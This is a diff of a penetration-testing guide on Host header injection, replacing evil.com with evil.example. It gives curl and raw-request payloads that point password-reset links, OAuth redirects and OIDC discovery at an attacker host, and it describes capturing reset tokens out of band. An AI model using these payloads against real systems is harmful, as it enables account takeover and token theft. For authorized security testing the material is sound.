@@ -34,9 +34,9 @@ Host header injection that reaches password reset links = Critical (ATO for any 
 
 **Highest-value chains:**
 - **Password reset poisoning → ATO** — server builds the reset link from the request Host;
-  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
+  attacker sets `Host: evil.example`; the victim's reset email points the token at the attacker →
   token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
-  their own reset leaks the token to evil.com.
+  their own reset leaks the token to evil.example.
 - **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
   an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
   entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
@@ -80,37 +80,37 @@ X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class
 ```bash
 # 1a. Override Host directly
 curl -s -X POST https://$TARGET/forgot-password \
-  -H "Host: evil.com" \
+  -H "Host: evil.example" \
   -H "Content-Type: application/json" \
-  -d '{"email":"your-test-account@target.com"}'
+  -d '{"email":"your-test-account@target.example"}'
 
 # 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
 curl -s -X POST https://$TARGET/forgot-password \
   -H "Host: $TARGET" \
-  -H "X-Forwarded-Host: evil.com" \
-  -d "email=your-test-account@target.com"
+  -H "X-Forwarded-Host: evil.example" \
+  -d "email=your-test-account@target.example"
 
 # 1c. Host + X-Forwarded-Host combo, and X-Host
 curl -s -X POST https://$TARGET/forgot-password \
-  -H "Host: $TARGET" -H "X-Host: evil.com" \
-  -d "email=your-test-account@target.com"
+  -H "Host: $TARGET" -H "X-Host: evil.example" \
+  -d "email=your-test-account@target.example"
 
 # 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
-printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
+printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.example\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.example' "$TARGET" \
   | openssl s_client -quiet -connect $TARGET:443 2>/dev/null
 
 # 1e. Absolute-URL injection: keep real Host, append attacker host so the
-#     reset link becomes https://TARGET.evil.com/... or routes the token out
+#     reset link becomes https://TARGET.evil.example/... or routes the token out
 curl -s -X POST https://$TARGET/forgot-password \
-  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"
+  -H "Host: $TARGET.evil.example" -d "email=your-test-account@target.example"
 
 # 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
 curl -s -X POST https://$TARGET/forgot-password \
-  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
+  -H "Host: $TARGET:1@evil.example" -d "email=your-test-account@target.example"
 ```
 
 **Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
-appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
+appear under an attacker-controlled host (`evil.example`, `$TARGET.evil.example`, or a Collaborator
 domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
 that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
 have proof — see Validation.
@@ -197,10 +197,10 @@ curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metri
 ```bash
 # Does the authorization endpoint build redirect_uri / display URL from Host?
 curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
-  -H "Host: evil.com" | grep -iE "redirect|location|action="
+  -H "Host: evil.example" | grep -iE "redirect|location|action="
 
 # OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
-curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
+curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.example" \
   | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
 ```
 
